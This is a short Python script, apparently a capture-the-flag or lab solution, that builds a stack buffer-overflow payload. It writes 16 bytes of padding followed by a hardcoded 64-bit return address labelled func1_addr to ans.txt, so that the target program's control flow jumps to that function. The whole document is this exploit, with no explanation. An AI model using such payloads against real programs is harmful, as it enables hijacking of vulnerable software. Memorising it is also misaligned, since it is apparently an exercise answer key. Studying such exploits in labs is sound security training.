padding = b"A" * 16 
func1_addr = b"\x16\x12\x40\x00\x00\x00\x00\x00"
payload = padding+ func1_addr
with open("ans.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans.txt")